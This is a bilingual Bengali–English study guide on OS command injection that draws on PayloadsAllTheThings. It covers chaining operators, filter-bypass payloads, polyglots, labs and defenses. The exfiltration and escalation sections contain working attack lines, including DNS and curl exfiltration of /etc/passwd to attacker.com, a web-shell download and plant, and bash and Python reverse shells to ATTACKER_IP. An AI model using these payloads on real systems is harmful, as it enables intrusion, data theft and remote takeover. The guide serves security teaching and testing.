# 💀 Command Injection — Detailed Study Notes

> **Source:** [PayloadsAllTheThings/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
> **Also Known As:** Shell Injection, OS Command Injection, RCE (Remote Code Execution)
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — Command Injection কী?](#1-concept--command-injection-কী)
2. [Vulnerable Code — কীভাবে হয়?](#2-vulnerable-code--কীভাবে-হয়)
3. [Command Chaining Operators](#3-command-chaining-operators)
4. [Injection Types](#4-injection-types)
   - [Basic Injection](#41-basic-injection)
   - [Argument Injection](#42-argument-injection)
   - [Inside A Command (Substitution)](#43-inside-a-command-substitution)
5. [Filter Bypass Techniques](#5-filter-bypass-techniques)
   - [Space Bypass](#51-space-bypass)
   - [Quote Bypass](#52-quote-bypass)
   - [Character Filter Bypass](#53-character-filter-bypass)
   - [Hex Encoding Bypass](#54-hex-encoding-bypass)
   - [Variable/Wildcard Bypass](#55-variablewildcard-bypass)
   - [Case Bypass (Windows)](#56-case-bypass-windows)
6. [Data Exfiltration (Blind Injection)](#6-data-exfiltration-blind-injection)
   - [Time-Based Exfiltration](#61-time-based-exfiltration)
   - [DNS-Based Exfiltration](#62-dns-based-exfiltration)
7. [Polyglot Command Injection](#7-polyglot-command-injection)
8. [Advanced Tricks](#8-advanced-tricks)
9. [Challenge — Obfuscated Command Analysis](#9-challenge--obfuscated-command-analysis)
10. [Practical Lab Setup](#10-practical-lab-setup)
11. [Testing Methodology](#11-testing-methodology)
12. [Defense — Prevention](#12-defense--prevention)
13. [References](#13-references)

---

## 1. Concept — Command Injection কী?

**Command Injection** হলো সেই attack যেখানে attacker vulnerable application এর মাধ্যমে **host OS এ arbitrary commands execute** করতে পারে।

```
Impact Level: 🔴 CRITICAL
Potential Result: Full System Compromise (RCE)
```

```
Real-World Analogy:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  তুমি একটা restaurant এ গেলে order form পূরণ করো:          │
│  "আমি চাই: ভাত"                                             │
│                                                              │
│  Normal: রান্নাঘরে যায় → ভাত রান্না হয়                    │
│                                                              │
│  Malicious: "আমি চাই: ভাত; তারপর রান্নাঘর আগুন লাগাও"     │
│  → রান্নাঘর আগুনে পুড়ে যায়! (system compromise!)          │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### কোথায় এই vulnerability পাওয়া যায়?

```
✅ Web apps যেগুলো OS command call করে:
   - ping/traceroute tool (network diagnostics)
   - Image processing (ImageMagick, ffmpeg)
   - PDF generators
   - File compression (zip/unzip)
   - DNS lookup features
   - Email sending utilities
   - Log viewers
   - Network scanners

Common languages/functions যেগুলো vulnerable:
  PHP:    system(), exec(), passthru(), shell_exec(), `backtick`
  Python: os.system(), subprocess.call(), os.popen()
  Node.js: exec(), spawn(), execSync()
  Java:   Runtime.exec(), ProcessBuilder
  Ruby:   system(), exec(), `backtick`
```

---

## 2. Vulnerable Code — কীভাবে হয়?

### PHP Example (Classic)

```php
<?php
// ❌ VULNERABLE CODE:
$ip = $_GET['ip'];          // user থেকে input নেওয়া হচ্ছে
system("ping -c 4 " . $ip); // সরাসরি shell এ pass করা হচ্ছে!
?>
```

```
Normal Usage:
  URL: /ping.php?ip=8.8.8.8
  Command: ping -c 4 8.8.8.8
  Result: Normal ping output ✅

Attack:
  URL: /ping.php?ip=8.8.8.8;cat /etc/passwd
  Command: ping -c 4 8.8.8.8;cat /etc/passwd
                             ↑
                    এই ; দিয়ে নতুন command!
  Result: ping করে, তারপর /etc/passwd দেখায়! ⚠️
```

### Python Example

```python
# ❌ VULNERABLE:
import os
domain = request.args.get('domain')
os.system(f"nslookup {domain}")  # injection possible!

# Attack:
# domain = "google.com; rm -rf /tmp/*"
# Executes: nslookup google.com; rm -rf /tmp/*
```

### Node.js Example

```javascript
// ❌ VULNERABLE:
const { exec } = require('child_process')
const filename = req.query.file
exec(`cat logs/${filename}`, (err, stdout) => {
  res.send(stdout)
})

// Attack:
// file = "../../etc/passwd"  → Directory Traversal
// file = "app.log; whoami"   → Command Injection!
```

---

## 3. Command Chaining Operators

এগুলো Linux/Unix shell এ একাধিক command একসাথে run করার উপায়:

```
Operator  মানে                           Example
──────────────────────────────────────────────────────────────────
;         Sequential (সবসময় পরেরটা চলে)  cmd1; cmd2
&&        AND (প্রথমটা success → পরেরটা) cmd1 && cmd2
||        OR  (প্রথমটা fail → পরেরটা)   cmd1 || cmd2
&         Background (async)            cmd1 & cmd2
|         Pipe (output → input)         cmd1 | cmd2
\n        Newline (line break)          cmd1\ncmd2
```

### Practical Examples

```bash
# ; — সবসময় দুটো command চলে:
ping -c 4 8.8.8.8; cat /etc/passwd
# Result: ping করে, তারপর passwd file দেখায়

# && — শুধু ping success হলে whoami চলবে:
ping -c 1 8.8.8.8 && whoami
# Result: ping success → whoami output দেখায়

# || — ping fail হলে আমার command চলবে:
ping -c 1 INVALID_HOST || cat /etc/shadow
# Result: ping fail → /etc/shadow read করে!

# | — pipe: প্রথম command এর output দ্বিতীয় command এ:
cat /etc/passwd | grep root
# Result: শুধু root সম্পর্কিত lines দেখায়

# Newline:
ping -c 4 8.8.8.8
whoami
# URL encoded: ping+-c+4+8.8.8.8%0awhoami
```

---

## 4. Injection Types

### 4.1 Basic Injection

```bash
# সরাসরি command chaining:
127.0.0.1; ls -la
127.0.0.1 && cat /etc/passwd
127.0.0.1 | whoami
127.0.0.1 || id

# What to try first:
whoami           # current user জানো
id               # user ID এবং groups
hostname         # server name
uname -a         # OS info
cat /etc/passwd  # users list
ls -la /         # root directory
pwd              # current directory
env              # environment variables
```

### 4.2 Argument Injection

যখন তুমি পুরো command change করতে পারছো না, কিন্তু **শুধু arguments append** করতে পারছো।

```bash
# Chrome:
chrome '--gpu-launcher="id>/tmp/foo"'
# → Chrome launch হয়, এবং id command /tmp/foo তে write করে

# SSH:
ssh '-oProxyCommand="touch /tmp/pwned"' foo@foo
# → SSH connect করার আগে ProxyCommand execute হয়!

# PostgreSQL (psql):
psql -o'|id>/tmp/foo'
# → psql এর output id command এ pipe হয়!
```

**WORSTFit Technique (Windows — 2025 নতুন research):**

```php
// PHP code:
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));

// escapeshellarg() সাধারণত safe
// কিন্তু fullwidth quotes দিয়ে bypass!

// Normal quotes: "  (U+0022)
// Fullwidth:     ＂  (U+FF02) — দেখতে same কিন্তু different character!

// Payload: ＂ --use-askpass=calc ＂
// Windows ANSI conversion: ＂ → "  (transformation happens!)
// Result: calc.exe execute হয়!
```

### 4.3 Inside A Command (Substitution)

যখন তুমি একটা command এর ভেতরে inject করছো:

```bash
# Original server command:
# original_cmd_by_server ARGUMENT

# Backtick substitution:
original_cmd_by_server `cat /etc/passwd`
# Shell প্রথমে `cat /etc/passwd` execute করে
# তার output টা argument হিসেবে use হয়

# $() substitution:
original_cmd_by_server $(cat /etc/passwd)
# Same effect, modern syntax

# Nested:
original_cmd_by_server $(cat $(find / -name "secret.txt" 2>/dev/null))
```

---

## 5. Filter Bypass Techniques

Application অনেক সময় filter করে dangerous characters। এগুলো bypass করার techniques:

### 5.1 Space Bypass

যখন space character ` ` filter করা হয়েছে:

```bash
# Method 1: $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
ls${IFS}-la
cat${IFS}/etc${IFS}passwd

# Method 2: Brace expansion
{cat,/etc/passwd}
# Shell executes: cat /etc/passwd

# Method 3: Input redirection (< operator)
cat</etc/passwd
# < এর পরে space লাগে না!

# Method 4: Tab character (%09)
ls%09-la%09/home
# Tab = ASCII 0x09

# Method 5: ANSI-C Quoting
X=$'uname\x20-a'&&$X
# \x20 = space এর hex encoding
```

### 5.2 Quote Bypass

যখন command টা quote এর ভেতরে আছে বা quote filter করা হয়েছে:

```bash
# Single quote bypass:
w'h'o'am'i     # → whoami (quotes ignored inside command name)
wh''oami       # → whoami (empty string ignored)
'w'hoami       # → whoami

# Double quote bypass:
w"h"o"am"i     # → whoami
wh""oami       # → whoami
"wh"oami       # → whoami

# Backtick bypass:
wh``oami       # → whoami (empty backtick = empty string)

# Backslash bypass:
w\ho\am\i      # → whoami (backslash-newline ignored)
/\b\i\n/////s\h  # → /bin/sh
```

### 5.3 Character Filter Bypass

যখন `/`, `\`, বা অন্য special characters block করা হয়েছে:

```bash
# / (slash) ছাড়া /etc/passwd পড়া:

# Method 1: ${HOME:0:1} = "/"
echo ${HOME:0:1}
# /home/user এর প্রথম character = /

cat ${HOME:0:1}etc${HOME:0:1}passwd
# = cat /etc/passwd ✅

# Method 2: tr command দিয়ে / generate করা:
echo . | tr '!-0' '"-1'
# ASCII shift করে . → /

cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
# = cat /etc/passwd ✅

# Method 3: Wildcard দিয়ে:
/???/??t /???/p??s??
# /bin/cat /etc/passwd (wildcard matching)

# Brace expansion wildcard:
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### 5.4 Hex Encoding Bypass

যখন plaintext commands filter করা হয়েছে:

```bash
# /etc/passwd = hex: 2f6574632f706173737764

# Method 1: echo -e hex
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
# Output: /etc/passwd

cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
# = cat /etc/passwd ✅

# Method 2: Variable assignment
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
cat $abc
# = cat /etc/passwd ✅

# Method 3: Full command hex encoding:
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
# \x20 = space, \x2f = /
# = cat /etc/passwd ✅

# Method 4: xxd decode:
cat `xxd -r -p <<< 2f6574632f706173737764`
# xxd -r -p: hex → binary
# = cat /etc/passwd ✅

# Hex conversion helper:
echo -n "/etc/passwd" | xxd -p
# Output: 2f6574632f706173737764
```

```
Character → Hex mapping (common):
  /  →  \x2f  (2f)
  space → \x20 (20)
  .  →  \x2e  (2e)
  ;  →  \x3b  (3b)
  |  →  \x7c  (7c)
```

### 5.5 Variable/Wildcard Bypass

```bash
# Variable manipulation:
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
# ${var//pattern/replacement}
# hhh/hm → empty string (remove করো)
# Result: cat /etc/passwd ✅

# Wildcard matching:
cat /???/passwd      # /etc/passwd (/??? = 3 char directory)
cat /e??/passwd      # /etc/passwd
ls /???/??t          # /bin/cat

# Windows wildcards:
powershell C:\*\*2\n??e*d.*?  # notepad খোলে!
```

### 5.6 Case Bypass (Windows)

```bash
# Windows case-insensitive:
WHOAMI       # works
wHoAmI       # works
WhOaMi       # works

DIR          # works
dir          # works
DiR          # works

# PowerShell:
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e  # calc.exe
```

---

## 6. Data Exfiltration (Blind Injection)

**Blind Command Injection** — যখন command execute হয় কিন্তু output directly দেখা যায় না।

### 6.1 Time-Based Exfiltration

Character by character data বের করা, timing দেখে।

```bash
# Concept:
# যদি first character 's' হয় → 5 second wait করো
# যদি না হয় → কোনো delay নেই

time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# ব্যাখ্যা:
# whoami = "sysadmin"
# cut -c 1 = প্রথম character = "s"
# s == s → true → sleep 5!

# Automation concept:
for char in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  time if [ $(whoami|cut -c 1) == $char ]; then sleep 5; fi
  # 5 second delay মানে এটাই correct character!
done
```

```
Data Exfiltration Flow:
┌────────────────────────────────────────────────────────────┐
│                                                            │
│  Attacker sends: ?ip=;if [$(whoami|cut -c1)==r];then      │
│                   sleep 5;fi                               │
│                                                            │
│  Server executes command                                   │
│         ↓                                                  │
│  Response after 5 seconds → first char is 'r' ✅          │
│  Response immediately → first char is NOT 'r' ❌          │
│                                                            │
│  Repeat for each position: r → o → o → t → "root"!       │
└────────────────────────────────────────────────────────────┘
```

### 6.2 DNS-Based Exfiltration

Data কে DNS query তে embed করে attacker এর server এ পাঠানো।

```bash
# Concept: secret data কে DNS subdomain হিসেবে পাঠাও
# Attacker এর server DNS queries log করে

# Step 1: interactsh.com বা dnsbin.zhack.ca এ account করো
# Step 2: তোমার unique subdomain পাও:
#   e.g., abcd1234.interactsh.com

# Step 3: Payload inject করো:

# ls output exfiltrate করো:
for i in $(ls /); do
  host "$i.YOUR_UNIQUE_ID.interactsh.com"
done
# প্রতিটা file/folder এর নাম DNS query হিসেবে যাবে!

# whoami exfiltrate:
host $(whoami).YOUR_UNIQUE_ID.interactsh.com
# DNS query: root.YOUR_UNIQUE_ID.interactsh.com
# → Attacker দেখলো username = "root"!

# /etc/passwd line by line:
cat /etc/passwd | while read line; do
  host "$(echo $line | md5sum | cut -c1-20).attacker.com"
done

# Curl দিয়ে (বেশি data):
curl "https://attacker.com/exfil?data=$(cat /etc/passwd | base64)"
```

```
DNS Exfiltration Flow:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Victim Server          DNS                  Attacker        │
│      │                   │                      │           │
│      │ host root.ab.com ─┤──── DNS query ───────>│           │
│      │                   │                      │           │
│      │                   │                  log: "root"     │
│      │                   │                      │           │
│      │ host /etc.ab.com ─┤──── DNS query ───────>│           │
│      │                   │                  log: "/etc"     │
│                                                              │
│  Attacker reads DNS logs → knows secret data!               │
└──────────────────────────────────────────────────────────────┘
```

**Tools:**

- `interactsh.com` — free OOB interaction server
- `dnsbin.zhack.ca` — DNS exfiltration tool
- Burp Collaborator — PortSwigger এর OOB tool

---

## 7. Polyglot Command Injection

**Polyglot** = এমন payload যেটা multiple context এ কাজ করে।

```
Problem: তুমি জানো না input কোথায় insert হচ্ছে:
  - Single-quoted string এর ভেতরে?
  - Double-quoted string এর ভেতরে?
  - Unquoted?

Solution: Polyglot payload — সব context এ কাজ করে!
```

### Example 1 — Sleep Test

```bash
Payload:
  1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

Context 1 (unquoted):
  echo 1;sleep${IFS}9;#...
  → sleep 9 ← কাজ করে! ✅

Context 2 (single-quoted):
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#...
  → ' close করে, তারপর sleep 9 ← কাজ করে! ✅

Context 3 (double-quoted):
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#...
  → " close করে, তারপর sleep 9 ← কাজ করে! ✅
```

### Example 2 — Complex Polyglot

```bash
Payload:
  /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

এটা simultaneously কাজ করে:
  - Bash command substitution: $(sleep 5)
  - Backtick substitution: `sleep 5`
  - SQL context: sleep(5)
  - Single/double quote contexts

যেকোনো context এ inject করো → sleep 5 trigger হবে!
```

---

## 8. Advanced Tricks

### Background Long-Running Commands

```bash
# Problem: Command inject করলে server timeout করে দেয়
# Solution: nohup দিয়ে background এ চালাও

nohup sleep 120 > /dev/null &
# nohup: parent process বন্ধ হলেও চলতে থাকো
# > /dev/null: output discard করো
# & : background এ run করো

# Reverse shell background এ:
nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
```

### Remove Arguments After Injection

```bash
# -- সব পরবর্তী arguments কে options হিসেবে treat না করে
# Injection এর পরের arguments কে neutralize করতে:

inject_point -- legitimate_arguments_that_follow

# Example:
some_command $(cat /etc/passwd) -- --safe-arg
# -- এর পরে --safe-arg option হিসেবে না দেখে argument হিসেবে দেখে
```

### Redirect Output to Web Shell

```bash
# Direct command output দেখতে না পেলে:
# 1. Web root এ file write করো

curl http://ATTACKER.com/shell.php -o /var/www/html/shell.php
# Attacker এর server থেকে web shell download করো!

# 2. অথবা echo দিয়ে directly লিখো:
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php

# 3. তারপর access করো:
# https://victim.com/shell.php?cmd=whoami
```

---

## 9. Challenge — Obfuscated Command Analysis

```bash
# Challenge: এই command টা কী করে?
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

### Step-by-Step Breakdown

```bash
# Part 1: g variable এর value বের করো
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e

# Shell এ quotes এবং backslash গুলো remove করলে:
# "/e"  = /e
# \h    = h (backslash-h = h)
# "hh"  = hh
# /hm   = /hm
# "t"   = t
# c     = c
# /\i   = /i (backslash-i = i)
# "sh"  = sh
# hh    = hh
# /hm   = /hm
# su\e  = sue (backslash-e = e)

# Concatenated: /ehhh/hmtc/ishhh/hmssue ← intermediate value
# (with the noise characters: hh??hm)

# Part 2: ${g//hh??hm/}
# Variable substitution: g এর মধ্যে "hh??hm" pattern remove করো
# hh??hm = hh + any 2 chars + hm
# /ehhh/hmtc → remove "hhh/hm" → /etc
# /ishhh/hmssue → remove "hhh/hm" → /issue

# So: ${g//hh??hm/} = /etc/issue

# Part 3: tac$@<${g//hh??hm/}
# tac = cat backwards (lines in reverse order)
# $@ = empty (no arguments)
# < = input redirection
# Final: tac < /etc/issue

# Answer: tac /etc/issue
# এটা /etc/issue file এর contents reverse order এ print করে!
# (Usually shows OS version/login banner)

# SAFE to run ✅ — শুধু OS info দেখায়
```

```
Obfuscation technique used:
  1. Fake noise characters injection: "hh", "/hm", "\e"
  2. Quote splitting: "/e"\h"hh" = /ehh
  3. Variable substitution: ${g//pattern/} for cleanup
  4. tac instead of cat (reverse)
  5. $@ empty expansion
```

---

## 10. Practical Lab Setup

### Lab 1: DVWA (Damn Vulnerable Web Application)

```bash
# Docker দিয়ে DVWA চালাও:
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# Browser: http://localhost/dvwa
# Login: admin / password
# Go to: Command Injection section
# Security: Low → Medium → High (step by step)
```

```
DVWA Low Security (no filter):
  Input: 127.0.0.1
  Attack: 127.0.0.1; cat /etc/passwd
          127.0.0.1 && whoami
          127.0.0.1 | id

DVWA Medium Security (some filter):
  && এবং ; filter করা
  Attack: 127.0.0.1| whoami     (space নেই | এর আগে)
          127.0.0.1 |whoami
          127.0.0.1 || whoami

DVWA High Security (stricter filter):
  Most operators filtered
  Attack: 127.0.0.1|whoami     (pipe trick)
```

### Lab 2: PortSwigger Web Security Academy

```
Free labs:
  ✅ OS command injection, simple case
     https://portswigger.net/web-security/os-command-injection/lab-simple

  ✅ Blind OS command injection with time delays
     https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

  ✅ Blind OS command injection with output redirection
     https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

  ✅ Blind OS command injection with out-of-band interaction
     https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

  ✅ Blind OS command injection with out-of-band data exfiltration
     https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
```

### Lab 3: নিজে বানাও — Vulnerable PHP App

```bash
# Parrot OS এ Apache + PHP:
sudo apt install apache2 php -y
sudo systemctl start apache2

# Vulnerable file বানাও:
sudo tee /var/www/html/ping.php << 'EOF'
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    // ❌ VULNERABLE: No sanitization!
    $output = shell_exec("ping -c 2 " . $ip);
    echo "<pre>$output</pre>";
} else {
    echo '<form>IP: <input name="ip" value="8.8.8.8"><button>Ping</button></form>';
}
?>
EOF

# Browser: http://localhost/ping.php?ip=127.0.0.1
# Attack: http://localhost/ping.php?ip=127.0.0.1;whoami
```

### Lab 4: Commix Tool দিয়ে Automated Testing

```bash
# commix install (Parrot OS এ already আছে):
commix --help

# Basic scan:
commix --url="http://localhost/ping.php?ip=INJECT_HERE"

# POST request:
commix --url="http://target.com/ping" \
       --data="ip=INJECT_HERE" \
       --cookie="session=YOUR_SESSION"

# Blind injection:
commix --url="http://target.com/ping?ip=INJECT_HERE" \
       --technique=time

# তারপর commix interactive shell দেবে যদি vulnerable হয়!
```

---

## 11. Testing Methodology

### Step 1: Identify Input Points

```
কোথায় OS command call হতে পারে সেটা খোঁজো:

Application features:
  ✅ Ping / traceroute / nslookup tool
  ✅ "Test connection" button
  ✅ File upload + processing
  ✅ Image resize/conversion
  ✅ PDF generation
  ✅ Email sending with attachment
  ✅ Log viewer
  ✅ System info page
  ✅ Network diagnostic tools
```

### Step 2: Basic Probing

```bash
# Time-based detection (safest first — no output needed):
; sleep 5
| sleep 5
&& sleep 5
|| sleep 5
`sleep 5`
$(sleep 5)

# যদি response 5 seconds delay হয় → Command Injection confirmed!

# Output-based (যদি output দেখা যায়):
; whoami
| id
; cat /etc/passwd
```

### Step 3: Filter Detection

```bash
# Space blocked? Test:
;cat${IFS}/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd

# Semicolon blocked? Test:
|whoami
&&whoami
||whoami
`whoami`
$(whoami)

# Slash blocked? Test:
cat${HOME:0:1}etc${HOME:0:1}passwd

# Keywords blocked (cat, whoami)? Test:
w'h'o'am'i     # quote bypass
wh""oami       # double quote bypass
/usr/bin/id    # full path
```

### Step 4: Data Extraction

```bash
# Output visible → direct:
; cat /etc/passwd
; ls -la /home

# Blind → Time-based:
; if [ $(whoami|cut -c1) == r ]; then sleep 5; fi

# Blind → OOB (DNS):
; host $(whoami).attacker.com

# Blind → File write:
; cat /etc/passwd > /var/www/html/out.txt
# তারপর: http://victim.com/out.txt
```

### Step 5: Escalation

```bash
# Reverse shell পাঠাও:
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Attacker machine এ listener:
nc -lvnp 4444

# Python reverse shell (যদি bash না থাকে):
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 12. Defense — Prevention

### ✅ Fix 1: Never Pass User Input to Shell

```php
// ❌ VULNERABLE:
system("ping -c 4 " . $_GET['ip']);

// ✅ SAFE: Shell এ pass না করে library ব্যবহার করো:
// PHP তে raw socket দিয়ে ping করো
// অথবা validated parameter দাও
```

### ✅ Fix 2: Input Validation (Allowlist)

```php
// ✅ SAFE: Strict IP validation
$ip = $_GET['ip'];

// Allowlist: শুধু valid IP format accept করো
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}

// এখন safe:
system("ping -c 4 " . escapeshellarg($ip));
```

```python
# Python:
import re, subprocess, shlex

ip = request.args.get('ip', '')

# Allowlist validation
if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
    return "Invalid IP", 400

# Use subprocess with list (no shell=True!)
result = subprocess.run(
    ['ping', '-c', '4', ip],  # ← list, not string!
    capture_output=True,
    text=True,
    timeout=10
)
```

### ✅ Fix 3: Avoid Shell=True

```python
# ❌ VULNERABLE:
import subprocess
cmd = "ping -c 4 " + user_input
subprocess.run(cmd, shell=True)  # shell=True → injection possible!

# ✅ SAFE:
subprocess.run(['ping', '-c', '4', user_input])
# List form: প্রতিটা argument আলাদা
# Shell parsing হয় না → injection impossible!
```

### ✅ Fix 4: escapeshellarg() / escapeshellcmd()

```php
// PHP:
$ip = $_GET['ip'];

// escapeshellarg: single quotes দিয়ে wrap করে
$safe_ip = escapeshellarg($ip);  // '8.8.8.8; cat /etc/passwd' → এটা একটা argument হিসেবে treat হবে

system("ping -c 4 " . $safe_ip);

// BUT: escapeshellarg এ পরিচিত bypass আছে!
// সবচেয়ে safe: allowlist validation + escapeshellarg একসাথে
```

### ✅ Fix 5: Principle of Least Privilege

```bash
# Web server যে user এ চলে সে যেন কম permission পায়:

# ❌ Root এ web server চালানো:
# Apache running as root → injection = full root access!

# ✅ Dedicated low-privilege user:
# Apache running as www-data → injection = limited damage

# chroot/container দিয়ে isolate করো:
docker run --cap-drop=ALL --read-only nginx
```

### Defense Summary

```
Attack                           → Fix
────────────────────────────────────────────────────────────────────
User input in system()           → Never pass user input to shell
                                   Use library/API instead
Special chars (;|&&)             → Allowlist validation (regex)
Bypass via encoding              → Server-side normalized validation
Bypass via $IFS, quotes          → subprocess list form (no shell=True)
Argument injection               → escapeshellarg() + allowlist
Blind injection                  → Same fixes above
```

---

## 13. References

| Resource                         | Link                                                                                                             |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings             | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)                    |
| PortSwigger OS Command Injection | [Web Security Academy](https://portswigger.net/web-security/os-command-injection)                                |
| commix Tool                      | [GitHub](https://github.com/commixproject/commix)                                                                |
| interactsh (OOB server)          | [GitHub](https://github.com/projectdiscovery/interactsh)                                                         |
| Argument Injection Vectors       | [Sonar](https://sonarsource.github.io/argument-injection-vectors/)                                               |
| WORSTFit Technique               | [Orange Tsai Blog](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) |
| DVWA                             | [GitHub](https://github.com/digininja/DVWA)                                                                      |
| Root Me — Command Injection      | [Root Me](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)                      |

---

> ✅ **Next Topic Suggestions:**
>
> - `Server Side Template Injection/README.md` — SSTI (also leads to RCE)
> - `File Inclusion/README.md` — LFI/RFI → RCE chain
> - `SQL Injection/README.md` — Another injection class
> - `Reverse Shell Cheatsheet.md` — Command injection এর পরের step!

> ⚠️ **Ethical Reminder:** Command Injection testing শুধুমাত্র authorized pentest, Bug Bounty program scope, বা নিজের lab এ করো। Unauthorized RCE is a serious criminal offense।
